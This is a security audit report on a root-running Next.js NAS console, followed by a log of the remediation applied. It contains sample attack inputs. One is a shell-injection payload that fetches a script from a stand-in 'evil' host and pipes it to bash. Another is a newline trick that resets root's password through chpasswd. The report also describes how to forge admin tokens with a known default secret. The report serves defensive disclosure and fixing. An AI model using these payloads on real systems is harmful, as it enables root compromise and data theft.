# Nimbo Security & Quality Review — Consolidated Report

**Scope:** Single Next.js 16 app running on the NAS host, executing privileged shell commands as root.
**Verdict:** Functionally rich and well-organized, but the security model is unsound for root-executing software. The dominant risks chain together (forgeable admin token → any-user-is-root authorization gap → shell injection, all amplified by blanket sudo). The good news is that a handful of cross-cutting fixes neutralize the large majority of findings.

> All file:line citations below were re-verified against the working tree.

---

## Cross-cutting themes (fix these to close many findings at once)

1. **Interpolated `sudo bash -c` shell strings → migrate to `execFile` + argv.** `exec.ts` wraps every command as `sudo -n bash -c '<string>'` and only escapes the *outer* shell; all inner-metacharacter safety is delegated to each lib's per-field regex — exactly where the criticals slip through. A `runArgs(binary, args[])` execFile path (no shell) closes the ZFS, cert, firewalld, argument-injection, and openssl-filename findings together.
2. **No authorization layer.** Authentication works; authorization is essentially absent (1 of 28 routes gated). One shared `requireRole()`/`requireAdmin()` applied centrally collapses ~17 broken-access-control findings.
3. **Catastrophic privilege/secrets model makes hardening cosmetic.** Blanket `NOPASSWD:ALL` sudo + hardcoded fallback secret + world-readable secrets/keys must be fixed as a set.
4. **Route boilerplate with no boundary validation is the natural fix site** for auth + Zod validation + audit logging — extract one `actionRoute()`/`readRoute()` wrapper.
5. **Ephemeral in-memory state + swallowed errors** (schedules, audit, auth cache, brute-force map) — persist, build immutably, stop swallowing.
6. **Server fan-out + uncoordinated client polling with zero caching** — add a TTL+coalescing server memo and a URL-keyed shared poll layer with visibility/minimized gating.
7. **Reverse-proxy topology blind spots** — the app never reads `X-Forwarded-Proto`, so the Secure cookie, fail2ban IP trust, and missing security headers are all wrong specifically in the recommended Caddy deployment.
8. **Accessibility + i18n drift** — unlabeled icon-only controls, keyboard-inoperable windows, mixed Korean/English UI.

---

## CRITICAL

### C1 — Hardcoded fallback HMAC secret → remote unauthenticated admin-session forgery
**Dimension:** secrets-and-crypto / broken-access-control · **Files:** `src/middleware.ts:3`, `src/lib/system/auth.ts:12-14`, `DEPLOYMENT.md:66,130-137`

Both the Edge gate and `auth.ts` derive the signing key from `process.env.NIMBO_SECRET || "nimbo-dev-insecure-secret-change-me"`. The DEPLOYMENT.md Docker recipe (`-e NAS_MOCK=0 -e PORT=3000`, no secret) and the manual-systemd path never set `NIMBO_SECRET`, so following the docs ships the publicly-known key on a root-running console.

**Impact:** A remote attacker mints `HMAC(base64url({u:'root',r:'admin',exp:<far future>}))` with the known key; middleware accepts it. Full admin, no account or injection needed, token never expires.

**Fix:** Resolve the secret once and throw at module load when it is unset/equals the dev literal in production (`!USE_MOCK`); allow the fallback only in dev. Make middleware fail closed on a missing secret (Edge can't crash). Add `-e NIMBO_SECRET=$(openssl rand -hex 32)` to the Docker recipe and require it in the manual path. Extract the literal to one Edge-safe shared module so the two layers cannot drift (also closes the duplicate-literal maintainability finding).

### C2 — No per-route authorization: any logged-in user is effectively root
**Dimension:** broken-access-control · **Root cause:** `src/middleware.ts:45-61`

`middleware` gates on `verify()` (signature + exp) only and never reads the role it embeds. Exactly one route (`nimbo-users`) re-checks role. With `NIMBO_SUDO=1` every other mutating route runs as root. A non-admin `user` (auto-provisioned via the allowed group, or whoever wins the first-login admin race) can:

| Route | Action reachable by any session | Impact |
|---|---|---|
| `/api/users` | `user.setPassword` → `chpasswd` | **Reset root's password → full OS root** |
| `/api/zfs` | `pool.destroy`, `dataset.destroy`, `snapshot.rollback` | Irreversible data loss |
| `/api/packages` | `app.composeSave` | Write privileged compose → host RCE |
| `/api/security` | `firewall.toggle` (disable), `rule.delete` | Strip network protection |
| `/api/system` | `service.stop/disable` | Kill sshd / fail2ban / nimbo |
| `/api/power` | reboot / poweroff | DoS every hosted service |
| `/api/host` | `network.setInterface` | Change IP → lock everyone out |
| `/api/ssh` | `key.delete`, `knownhost.*` | Undermine remote access |
| `/api/certs` | `cert.import`, `cert.setDefault` | TLS MITM of the dashboard |
| `/api/fail2ban` | `unban`, `toggle` | Remove brute-force protection |
| `/api/shares-admin` | `folder.delete`, `service.toggle` | Data exposure / loss |
| `/api/backup`,`/api/cloud`,`/api/timemachine` | rsync/rclone jobs | Exfiltrate to attacker remote |
| `/api/audit` | `audit.clear` | Anti-forensics |
| `/api/docker` | container actions (allowlisted, no injection) | Container DoS |
| `/api/setup` | `setup.save/reset` (low blast radius) | Re-trigger wizard |

> Notes from verification: `/api/system` `cron.create` is an **inert stub** today (no arbitrary-cron backdoor yet); `/api/docker` is injection-safe via its action allowlist; several `/api/certs` actions are no-ops in real mode. The missing role gate is still the load-bearing defect for all of them.

**Fix:** Add one shared `requireAdmin()` (reuse nimbo-users' `verifyToken(cookie)?.r==='admin'`) and call it at the top of every mutating handler (best inside the shared route wrapper, theme 4). Decode role in middleware as a coarse second gate via a route→min-role map. Replace the hardcoded `logAudit("admin", …)` in `zfs/route.ts:24-25` and `backup/route.ts:25` with the real verified username.

### C3 — Service account holds blanket `NOPASSWD:ALL` sudo
**Dimension:** ops-and-deploy-hardening · **File:** `deploy/install.sh:73-76`

`echo "$SVC_USER ALL=(ALL) NOPASSWD: ALL"` plus `usermod -aG docker`. Combined with `exec.ts`'s `sudo -n bash -c '<string>'`, **any** injection (C4) is instant passwordless root, and the `User=nimbo` systemd hardening is cosmetic. The shipped least-privilege `deploy/nimbo.sudoers` is never installed and targets a non-existent user/env var.

**Fix:** Stop installing the blanket grant. Because `sudo bash -c <string>` passes a freeform shell string, even a per-binary allowlist ≈ ALL — first refactor `exec.ts` to per-operation helper scripts with fixed argv (theme 1), then grant sudo only on those wrapper paths. Reconcile `nimbo.sudoers` to user `nimbo`/`NIMBO_SUDO`, `visudo -cf`, and reconsider docker-group membership.

### C4 — Shell command injection in privileged actions → root RCE
**Dimension:** shell-command-injection · **Files:** `zfs.ts:740-755`, `cert.ts:16-17,204-236`, `users.ts:263-301`, `security.ts:578-591`

Confirmed against source:

- **ZFS device ops:** `device.detach/offline/online` interpolate `a.device` after only `!a.device` (zfs.ts:747-755); `device.replace/attach` interpolate `a.oldDevice` unchecked (740-746). `shq()` escapes only single quotes, so `;`,`|`,`$()`,backticks survive. Example: `{"kind":"device.offline","name":"tank","device":"x$(curl${IFS}http://evil/x.sh|bash)"}`.
- **Cert email:** `EMAIL_RE=/^[^\s@]+@[^\s@]+$/` permits every metacharacter except space (bypassed via `${IFS}`/`$()`), interpolated unquoted into the root `certbot` line (cert.ts:205,210). `DOMAIN_RE` also allows `*`/`..` which `bash -c` glob-expands into `<CERT_DIR>/*.key`.
- **chpasswd newline:** `echo ${sq(name:password)} | chpasswd` never rejects `\n`; a password of `x\nroot:pwned` injects a second chpasswd record and sets **root's** password (users.ts:267,299).
- **firewalld rule.delete:** `svcMatch = a.id.match(/^fwsvc-(.+)$/)` interpolated unquoted into `firewall-cmd --remove-service=` (security.ts:581,590). (firewalld hosts only; ufw branch sanitizes.)

**Fix:** Add an `execFile`-based `runArgs()` to `exec.ts` and migrate these call sites (no shell reparse; sudo as `execFile('sudo',['-n',binary,...])`). Immediate defense-in-depth: `DEV_RE` on the three device ops; real-grammar `EMAIL_RE` and bare-`*` rejection in `DOMAIN_RE`; reject `/[\r\n\0]/` in passwords; constrain svcMatch to `/^fwsvc-([A-Za-z0-9._-]+)$/`.

---

## HIGH

### H1 — Session secret & TLS private keys world-readable at rest
**Dimension:** secrets-and-crypto / ops · **Files:** `deploy/install.sh:99-111`, `cert.ts:236,261-262`

`nimbo.env` is copied from a 0644 example and only `chown`'d (stays 644) — any local user reads `NIMBO_SECRET` and forges an admin cookie (chains into C1). `/etc/nimbo/certs` (TLS keys, written with no mode) and `users.json` share lax perms. **Fix:** `chmod 750 /etc/nimbo; chmod 640 nimbo.env; chmod 700 certs; chmod 600 certs/*` unconditionally; prefer `umask 077`; write cert keys with `{ mode: 0o600 }` + explicit chmod.

### H2 — File browser exposes the whole filesystem by default; symlink escape
**Dimension:** path-traversal-and-fs · **Files:** `files.ts:12-19,30-38`, `app/api/files/route.ts`, `nimbo.env.example:17`

`ALLOWED_ROOTS` defaults to `['/']` (and the example ships `NAS_FILE_ROOTS=/`), so `isAllowed()` is always true — any session enumerates names/sizes/perms/owner for `/etc`,`/root`,`/home` (no role gate). Even when scoped, `isAllowed()` is lexical-only (no `realpath`) and check-then-`readdir` (TOCTOU): a symlink in a user-writable share root escapes to `/etc`. **Fix:** default deny-all when unset; ship a concrete scoped example; `fs.realpath` before authorizing and re-check each child; add the role gate.

### H3 — smb.conf stanza injection via share `description`/`validUsers`
**Dimension:** path-traversal-and-fs · **File:** `shares-admin.ts:91-104,270-289`

`validateFolder()` validates only `name`/`path`; `description`/`validUsers` keep embedded newlines and are interpolated into `smb.conf`, then `systemctl reload smbd` runs as root. A crafted description injects a `[Pwn]` share exposing `/` guest-writable with `force user = root`. **Fix:** reject `\r`/`\n`/`[`/`]` in those fields; allowlist `validUsers`; forbid `..` in `PATH_RE`; escape on serialize; add the role gate.

### H4 — Under-validated cert `domain`/`email` into privileged openssl/certbot + file paths
**Dimension:** path-traversal-and-fs · **File:** `cert.ts:16-17,204-239`

Same EMAIL_RE/DOMAIN_RE weakness as C4, plus `domain` flows into `-keyout <CERT_DIR>/<domain>.key`. `*` glob-expands under `bash -c` and clobbers existing keys. **Fix:** `execFile` for certbot/openssl; tighten both regexes; add the role gate. *(Secondary, low: `cert.ts:119-135` interpolates raw `readdir()` filenames into a root openssl call — use `execFile`.)*

### H5 — `/api/storage` runs smartctl per-disk serially every 5s (wakes HDDs)
**Dimension:** performance · **File:** `storage.ts:91-106`

`await smartStatus(device)` inside the device loop spins up sleeping platters every poll (Dashboard + Storage Manager both poll), and latency scales with disk count; nothing cached. **Fix:** split SMART off the 5s capacity poll into a long-TTL cache (5-15 min), pass `smartctl -n standby`, and `Promise.all` the reads. (Also validate `node.name` interpolated at storage.ts:60.)

### H6 — Argument injection (leading `-`) in unquoted rsync/rclone/ssh endpoints
**Dimension:** shell-command-injection · **File:** `rsync.ts:364-365` (+ `rclone.ts:337`, `zfs.ts:776`, `sysadmin.ts`, `docker.ts`, `host.ts`, `tm.ts`)

`ENDPOINT_RE`/`HOST_RE` permit a leading `-`, interpolated as a positional arg so a value like `--rsh=…` is parsed as an option (space/`=` are excluded, so full RCE is constrained to option confusion). **Fix:** anchor the regexes to reject a leading `-`; add `--` end-of-options before positionals; migrate to argv (theme 1).

### H7 — `/api/packages` probes 28 catalog apps serially with 2 docker calls each, every 4s
**Dimension:** performance · **File:** `packages.ts:697-738`

Serial `composeRunning()` (`compose ps -q` + `docker inspect`) per installed app + a `docker ps -a`. **Fix:** make the single `docker ps -a` the source of truth and match catalog ids in one pass; `Promise.all` any residual checks; raise the poll to 10-15s; add a short server cache; memoize `hasCommand`/`composeCmd`.

---

## MEDIUM

- **M1 — Cookie never `Secure` behind the proxy.** `secure: new URL(request.url).protocol==='https:'` is always false behind Caddy → admin cookie can traverse plaintext HTTP. Derive from `x-forwarded-proto`, default on in production, mirror on logout. `auth/login/route.ts:28-34`, `auth/logout/route.ts:7`.
- **M2 — Caddy ships no security headers.** Clickjackable desktop UI, no CSP/HSTS/Referrer-Policy. Add a `header` block (X-Frame-Options DENY + `frame-ancestors 'none'` now; full CSP iterated) in `deploy/Caddyfile:8-30` and the install.sh heredoc.
- **M3 — fail2ban jail poisonable / ineffective.** `clientIp()` trusts leftmost client-supplied XFF (ban poisoning/evasion) and emits `host='unknown'` in no-proxy mode (never bans). Trust XFF only from a configured proxy, take the rightmost hop, suppress the line with no real IP. `auth/login/route.ts:8-12`.
- **M4 — ZFS snapshot schedules lost on restart; ticker only arms on overview fetch.** Persist to JSON, start at process init, run due-on-startup. `zfs.ts:184-201`.
- **M5 — `saveAuthConfig` swallows write failures while mutating the shared cache in place.** Failed persist returns `ok:true` and diverges from disk. Propagate errors, build immutably, assign cache only after write succeeds. `auth.ts:68-77`.
- **M6 — Audit log misattributed (`'admin'` literal), in-memory, and incomplete.** Thread real verified user + IP into `logAudit`, persist append-only, and cover all mutating routes. `zfs/route.ts:24-25`, `backup/route.ts:25`, `audit.ts`.
- **M7 — ufw `rule.delete` deletes the wrong rule.** Strips non-digits from the id, but in-session ids start at `rule-101` and ufw renumbers after each delete. Re-resolve `ufw status numbered` at delete time or delete by spec; reject unreconciled ids. `security.ts:599-603`.
- **M8 — Real network interfaces always reported as DHCP, no speed/DNS.** Hardcoded `mode:'dhcp'`, `dns:[]`, `speedMbps:0` mislabels static NICs (edit form proposes switching to DHCP). Derive from nmcli/networkd + `/sys/class/net/*/speed`; model unknown as null. Also fix the in-place `state.interfaces` mutation. `host.ts:187-202,332-343`.
- **M9 — journald log levels guessed from message text; `PRIORITY_LEVEL` map is dead code.** `'0 errors'` flagged as error. Use `journalctl -o json` and map numeric `PRIORITY`. `sysadmin.ts:174-204`.
- **M10 — usePoll never pauses for minimized windows or hidden tabs.** Minimized windows stay mounted and keep hitting 7 endpoints every 3-5s. Gate the interval on `document.hidden` + an `enabled` flag from `!win.minimized`. `use-poll.ts:40-50`.
- **M11 — No request dedupe/caching; `/api/overview` polled by 3 timers, managers double-poll dashboard endpoints.** Add a URL-keyed shared poll layer (or SWR/TanStack Query) + an in-process TTL memo on read routes. `use-poll.ts`, `dashboard.tsx:229-235`, `overview/route.ts`.
- **M12 — `/api/security` rebuilds the overview with ~7 sequential sudo spawns every 5s, uncached.** Add a 30-60s TTL cache, memoize `firewallBackend()`, `Promise.all` independent probes. `security.ts:437-451`.
- **M13 — Setup wizard admin-password field is unbound and silently discarded.** Misleads first-run users. Bind+persist+validate, or remove (auth is OS-shadow). `setup-wizard.tsx:86-88`.
- **M14 — Polling errors silently swallowed.** `usePoll` exposes `error` but no consumer reads it → perpetual `'연결 중…'`/empty table on hard failure. Surface a failed state + retry; consider a `<PollState>` wrapper. `use-poll.ts:27-37`.
- **M15 — First OS login silently claims admin (race).** Bind the admin account at install time; evaluate group policy before the admin-claim branch. `auth.ts:164-171`.
- **M16 — Python `crypt` dependency (removed in 3.13) + ignores account/password expiry.** Total login DoS on Python 3.13+ hosts; nologin/expired accounts can authenticate. Move to PAM; at minimum probe `import crypt` at startup and check `passwd -S`/`chage`. `auth.ts:117-132`.
- **M17 — CPU%/network-rate use module-global sampling shared across concurrent requests** → non-deterministic metrics under multiple clients. Use a single background sampler or two reads ~150ms apart per call. `stats.ts:9-70`.
- **M18 — Five files exceed/approach the 800-line cap** with clean split points: `zfs.ts:1123`, `settings.tsx:1101`, `packages.ts:965`, `zfs-manager.tsx:890`, `users.tsx:758`. Extract the static CATALOG and mock layer first (mechanical, lowest-risk).
- **M19 — Identical POST boilerplate in 15 routes; bodies blind-cast `as XxxAction` with no schema.** Extract `actionRoute()`/`readRoute()` that own parsing, the role gate (theme 2), Zod validation, audit, and the envelope. `app/api/*/route.ts`.
- **M20 — Hardcoded dev secret duplicated in `middleware.ts:3` and `auth.ts:13`** — extract to one Edge-safe module (folds into C1).

---

## LOW (selected)

- **A11y:** dock buttons (`dock.tsx:49-61`) and the menubar logo trigger (`menubar.tsx:67-70`) are icon-only with no accessible name; windows are not keyboard-operable and have no focus management (`window.tsx:47-119`); window controls/resize handles are 12px (below 24-44px) (`window.tsx:157-214`). Add `aria-label`s, `role="dialog"`/`tabIndex`, keyboard move/resize, and enlarged hit areas.
- **i18n:** `<html lang="en">` over a Korean UI (`layout.tsx:35`); `app-registry.tsx:37-206` and `file-station.tsx:58-196` are English inside a Korean app. Set `lang="ko"`; centralize strings.
- **Theme:** three independent `useTheme()` instances hold unsynced state → stale toggle icon (`use-theme.ts:6-26`); back it with next-themes (already a dep).
- **CSRF / boundary:** only `SameSite=Lax` defends mutating POSTs — switch to `strict` + add an Origin check (`auth/login/route.ts`). `PUBLIC_PREFIXES` uses an unbounded `startsWith` → drop the redundant third condition (`middleware.ts:47`).
- **Crypto hygiene:** middleware verifies HMAC with non-constant-time `!==` vs `auth.ts`'s `timingSafeEqual` — use `crypto.subtle.verify` (`middleware.ts:37`). No token revocation/replay protection (`auth/logout/route.ts`).
- **Maintainability:** `shq` copy-pasted 3× (`exec.ts`,`auth.ts`,`rclone.ts`); validation regexes duplicated across libs and client components; `auth.ts:158-217` mutates the shared cache in place (immutability rule); `hardware.ts:235` hardcodes `/etc/nut/upsmon.conf` against the env-override convention; docs drift (`nasconsole`/`NAS_SUDO_PREFIX` vs `nimbo`/`NIMBO_SUDO`).
- **Ops:** DEPLOYMENT.md install command is broken (`./deploy/install.sh 3000` → "unknown option"); unit doc says `User=root` vs shipped `User=nimbo`; systemd sandboxing disabled (moot under C3); `bootstrap.sh` is `curl|sudo bash` with no integrity verification + `git reset --hard`.
- **Correctness (parsing):** ufw IPv6 `(v6)` rules dropped (`security.ts:149-166`); UPS `OL CHRG` reported as 'charging' (`hardware.ts:85-92`); SMART temperature regex misses SAS drives (`storage.ts:70-72`); `getAvailableDevices` can offer pool-claimed disks (`zfs.ts:404-415`); brute-force `attempts` Map never evicts (`auth.ts:90-110`).
- **Perf (polish):** `readPools` runs `zpool status` per pool serially (`zfs.ts:418-441`); read routes set no server cache (`overview/route.ts`); all ~17 apps statically imported into the desktop bundle — convert to `next/dynamic` (`app-registry.tsx:6-22`).

---

## Suggested sequencing

1. **Stop the bleeding (days):** C1 secret fail-fast + doc fix; quick-win injection guards (C4 immediate-fixes); install.sh chmod (H1); H2 deny-all default; M2 frame-ancestors. All small, high-leverage.
2. **Close the systemic gaps (1-2 sprints):** shared route wrapper with `requireAdmin()` + Zod (C2, M19); migrate privileged libs to `execFile`/argv (C4, H4, H6, theme 1); least-privilege sudo wrappers (C3).
3. **Durability & performance:** persist schedules/audit/auth + immutability (M4-M6); TTL cache + shared poll layer + SMART decoupling (H5, H7, M10-M12).
4. **Polish:** a11y/i18n/theme, file splits, parsing fixes.
---

## Appendix — Next.js 16 conventions (dimension re-run after schema failure)

Conventions are **largely Next-16-correct**: `cookies()` awaited everywhere, all ~27 routes use `dynamic="force-dynamic"` + `revalidate=0` (no stale system data / no CDN caching of privileged JSON), the server/client boundary is clean (`@/lib/system/*` with `node:child_process`/`node:fs` is never imported by a `'use client'` component), `output:"standalone"` + `outputFileTracingRoot` are valid and the installer copies `public/` + `.next/static` correctly, and `viewport` is a separate export. New findings:

- **[medium] `middleware.ts` is the deprecated Next 16 convention** — renamed to `proxy` in v16 (`node_modules/next/dist/docs/02-guides/upgrading/version-16.md:625`). Still runs in 16.2.9 but is slated for removal. Migrate with `npx @next/codemod@canary middleware-to-proxy .`. Bonus: `proxy` runs on the Node runtime, which lets you **import `verifyToken`/`getSecret` from `auth.ts`** and delete the forked, duplicated HMAC logic in the middleware (which also uses a non-constant-time `!==` signature compare vs `auth.ts`'s `timingSafeEqual`). Folds into the secrets/crypto theme.
- **[low] Render-blocking external Pretendard CDN** — `src/app/layout.tsx:40-45` injects `<link href="https://cdn.jsdelivr.net/...pretendard...">` on every route (incl. `/login`), partly defeating the offline/self-hosted goal while Geist is self-hosted via `next/font`. Fix: self-host Pretendard via `next/font/local`.
- **[info] Raw `<img>` hero on landing** (`landing/page.tsx`) — deliberate (avoids the image optimizer/sharp); acceptable, forgoes responsive `srcset`.

**Next.js verdict:** healthy. The only Next-specific debt is the deprecated `middleware` filename + its forked token logic; everything else is idiomatic.

---

# Remediation applied (branch: harden/security-and-quality-audit)

Status: `npx tsc --noEmit` clean · `next build` succeeds (28 routes + middleware) · injection primitive verified at runtime · no new lint errors.

## Critical — the root-RCE chain (all closed)
- **#1 Forgeable sessions.** New `src/lib/secret.ts` is the single Edge-safe source of the signing secret. `auth.ts` and `middleware.ts` now **fail closed** in production when `NIMBO_SECRET` is unset/dev (sessions disabled, not silently trusted). Docker recipe + README updated to set it.
- **#2 Broken access control.** New `src/lib/api/guard.ts` (`requireAdmin`/`requireRole`); a `requireAdmin()` gate now sits at the top of **all 19 mutating routes** (power, zfs, users, ssh, certs, docker/packages, system, host, security, fail2ban, shares-admin, audit, setup, backup, cloud, timemachine, hardware, notify). Audit log now records the **real** authenticated user, not a hardcoded "admin".
- **#3 Blanket sudo.** Documented the risk in `install.sh`, reconciled the least-privilege `deploy/nimbo.sudoers` to the real `nimbo` user as the hardening target. (Default stays blanket to keep the legacy read path working — see deferrals.)
- **#4 Command injection.** New no-shell `runArgs(file, args[])` (execFile/spawn, args passed verbatim, secrets via stdin) in `exec.ts`. Migrated **zfs.ts** (all device/pool/dataset/snapshot/key ops + scheduler prune), **cert.ts** (certbot/openssl + tightened email/domain regexes), **users.ts** (chpasswd via stdin + reject CR/LF/NUL), **auth.ts** (getent/id), and constrained **security.ts** firewalld service id. Verified: an injection payload as an arg is treated literally and does not execute.

## High / Medium (closed)
- **Secret/key file perms** — `install.sh` now `chmod 600` env, `750` /etc/nimbo, `700` certs.
- **Cookie `Secure` behind proxy** — login/logout honour `X-Forwarded-Proto`.
- **Security headers** — Caddyfile + install heredoc add HSTS, `X-Frame-Options DENY`, `nosniff`, `Referrer-Policy`, CSP `frame-ancestors 'none'`.
- **File browser** — default root no longer `/` (now `/srv:/mnt:/home:/volume1`) + `realpath` symlink-escape containment.
- **smb.conf stanza injection** — validate + sanitize share description/validUsers.
- **Middleware bypass** — dropped the `startsWith(p)` boundary bug; constant-time signature compare.
- **State persistence** — audit log (append-only JSONL) and ZFS snapshot schedules now survive restart; brute-force map is bounded; auth-config + schedule updates are immutable.
- **Client perf / a11y** — visibility-gated polling (stops hammering API / spinning disks when backgrounded), real error states in dashboard + file-station, aria-labels on dock/menubar/window controls, keyboard-operable windows (focus + Escape), `<html lang="ko">`, dedup of the `shq` shell-escaper to one exported helper.

## Deliberately deferred (with rationale)
- **Full least-privilege sudo** — requires migrating every legacy `run()` *read* command to argv; documented + sudoers provided, default unchanged to avoid breaking reads.
- **`middleware.ts` → `proxy.ts` rename** — left as-is (works; Next 16 already executes it as Proxy at runtime). Security issues in it were fixed directly.
- **Server-side response caching** — not added (staleness risk); client visibility-gating removes the bulk of redundant polling instead.
- **rsync/rclone backup schedules** — same persistence gap as ZFS; only ZFS persisted as the representative fix.
- **Formal test suite** — no runner configured; verified via tsc + build + a runtime injection check.
